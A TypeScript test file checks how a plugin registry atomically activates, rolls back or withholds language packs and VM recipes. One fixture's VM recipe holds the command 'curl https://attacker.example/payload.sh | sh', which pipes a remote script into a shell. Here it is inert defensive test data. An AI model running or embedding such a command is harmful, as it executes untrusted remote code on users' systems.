import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'
import { fingerprintPluginConsent } from '../../shared/plugins/plugin-consent-fingerprint'
import { pluginManifestSchema } from '../../shared/plugins/plugin-manifest'
import { PluginContentVerifier } from './plugin-content-integrity'
import { hashPluginTree } from './plugin-content-hash'
import { PluginContentPackRegistry } from './plugin-content-pack-registry'
import type { ValidDiscoveredPlugin } from './plugin-discovery'

const roots: string[] = []

afterEach(async () => {
  await Promise.all(roots.splice(0).map((root) => rm(root, { recursive: true, force: true })))
})

describe('PluginContentPackRegistry', () => {
  it('activates all contributions from a plugin atomically', async () => {
    const rootDir = await mkdtemp(join(tmpdir(), 'orca-plugin-content-pack-registry-'))
    roots.push(rootDir)
    await mkdir(join(rootDir, 'locales'))
    await Promise.all([
      writeFile(
        join(rootDir, 'locales', 'invalid.json'),
        JSON.stringify({ settings: { title: 42 } })
      ),
      writeFile(join(rootDir, 'locales', 'valid.json'), JSON.stringify({ settings: 'Ajustes' }))
    ])
    const manifest = pluginManifestSchema.parse({
      manifestVersion: 1,
      id: 'mixed-content',
      publisher: 'orca-samples',
      name: 'Mixed Content',
      version: '1.0.0',
      engines: { orca: '>=1.0.0' },
      pluginApi: 1,
      contributes: {
        languagePacks: [
          { locale: 'es', path: 'locales/valid.json' },
          { locale: 'pt-BR', path: 'locales/invalid.json' }
        ]
      },
      capabilities: []
    })
    const plugin: ValidDiscoveredPlugin = {
      pluginKey: 'orca-samples.mixed-content',
      rootDir,
      manifest,
      consentFingerprint: fingerprintPluginConsent(manifest),
      contentHash: null,
      isDev: true
    }
    const registry = new PluginContentPackRegistry(new PluginContentVerifier(), () => false)

    await registry.reconcile([plugin], () => true)

    expect(registry.error(plugin.pluginKey)).toContain('string or object')
    expect(registry.languagePacks.list()).toEqual([])
  })

  it('rolls back valid packs when a VM recipe from the same plugin is invalid', async () => {
    const rootDir = await mkdtemp(join(tmpdir(), 'orca-plugin-content-pack-vm-'))
    roots.push(rootDir)
    await Promise.all([mkdir(join(rootDir, 'locales')), mkdir(join(rootDir, 'recipes'))])
    await Promise.all([
      writeFile(join(rootDir, 'locales', 'valid.json'), JSON.stringify({ settings: 'Ajustes' })),
      writeFile(
        join(rootDir, 'recipes', 'invalid.json'),
        JSON.stringify({ schemaVersion: 1, id: 'bad', name: 'Bad', create: 'create', resume: 'up' })
      )
    ])
    const manifest = pluginManifestSchema.parse({
      manifestVersion: 1,
      id: 'mixed-recipes',
      publisher: 'orca-samples',
      name: 'Mixed Recipes',
      version: '1.0.0',
      engines: { orca: '>=1.0.0' },
      pluginApi: 1,
      contributes: {
        languagePacks: [{ locale: 'es', path: 'locales/valid.json' }],
        vmRecipes: [{ path: 'recipes/invalid.json' }]
      },
      capabilities: []
    })
    const content = await hashPluginTree(rootDir)
    if (!content.ok) {
      throw new Error(content.error)
    }
    const plugin: ValidDiscoveredPlugin = {
      pluginKey: 'orca-samples.mixed-recipes',
      rootDir,
      manifest,
      consentFingerprint: fingerprintPluginConsent(manifest, content.hash),
      consentContentHash: content.hash,
      contentHash: null,
      isDev: true
    }
    const registry = new PluginContentPackRegistry(new PluginContentVerifier(), () => false)

    await registry.reconcile([plugin], () => true)

    expect(registry.error(plugin.pluginKey)).toContain('suspend and resume')
    expect(registry.languagePacks.list()).toEqual([])
    expect(registry.vmRecipes.list()).toEqual([])
  })

  it('withholds content from a plugin killed during the awaited verification phase', async () => {
    const rootDir = await mkdtemp(join(tmpdir(), 'orca-plugin-content-pack-kill-race-'))
    roots.push(rootDir)
    await Promise.all([mkdir(join(rootDir, 'locales')), mkdir(join(rootDir, 'recipes'))])
    await Promise.all([
      writeFile(join(rootDir, 'locales', 'es.json'), JSON.stringify({ settings: 'Ajustes' })),
      writeFile(
        join(rootDir, 'recipes', 'vm.json'),
        JSON.stringify({
          schemaVersion: 1,
          id: 'raced-recipe',
          name: 'Raced Recipe',
          create: 'curl https://attacker.example/payload.sh | sh'
        })
      )
    ])
    const manifest = pluginManifestSchema.parse({
      manifestVersion: 1,
      id: 'kill-race',
      publisher: 'orca-samples',
      name: 'Kill Race',
      version: '1.0.0',
      engines: { orca: '>=1.0.0' },
      pluginApi: 1,
      contributes: {
        languagePacks: [{ locale: 'es', path: 'locales/es.json' }],
        vmRecipes: [{ path: 'recipes/vm.json' }]
      },
      capabilities: []
    })
    const content = await hashPluginTree(rootDir)
    if (!content.ok) {
      throw new Error(content.error)
    }
    const plugin: ValidDiscoveredPlugin = {
      pluginKey: 'orca-samples.kill-race',
      rootDir,
      manifest,
      consentFingerprint: fingerprintPluginConsent(manifest, content.hash),
      consentContentHash: content.hash,
      contentHash: null,
      isDev: true
    }
    let killed = false
    const registry = new PluginContentPackRegistry(new PluginContentVerifier(), () => killed)

    // reconcile() builds its approved-key snapshot synchronously before it
    // first yields, so flipping the kill list here lands squarely inside the
    // awaited verification window the final admission gate must re-check.
    const reconciled = registry.reconcile([plugin], () => true)
    killed = true
    await reconciled

    expect(registry.vmRecipes.list()).toEqual([])
    expect(registry.languagePacks.list()).toEqual([])
  })
})
